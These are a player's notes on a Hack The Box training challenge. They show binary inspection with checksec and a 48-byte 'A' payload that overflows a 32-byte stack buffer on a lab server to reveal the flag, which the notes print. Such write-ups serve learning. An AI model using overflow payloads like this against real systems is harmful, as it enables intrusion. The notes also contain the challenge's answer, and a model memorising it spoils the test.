# Getting-Started

## FLAG: HTB{b0f_s33m5_3z_r1ght?}

## Status: Incomplete

+ DOCKER: Yes
+ DOWNLOADABLE: Yes

Description: Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

## NOTES

1. Deploy Docker
   1. > IP: 165.232.108.236:32318
2. Extract files
   1. > unzip pwn_getting_started.zip
      1. FILES(S): libc.so.6, ld-liux-x86-64.so.2, wrapper.py, flag.txt, gs
3. Examine gs file
   1. > file gs
      1. RESPONSE: `gs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, for GNU/Linux 3.2.0, not stripped`
   2. > checksec gs
      1. Arch:     amd64-64-little
      2. RELRO:    Full RELRO
      3. Stack:    No canary found
      4. NX:       NX enabled
      5. PIE:      PIE enabled
      6. RUNPATH:  b'./glibc/'
4. NC
   1. > 165.232.108.236 32318
      1. Fill the 32-byte buffer, overwrite the alignment address and the "target's" 0xdeasdbeef value
         1. Since there is 32 bytes, + another 8 for the dummy alignment, + another 8 to overwrite 0xdeadbeef. That means we need 48 bytes
            1. print("A"*48)
         2. >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
      2. FLAG: `HTB{b0f_s33m5_3z_r1ght?}`
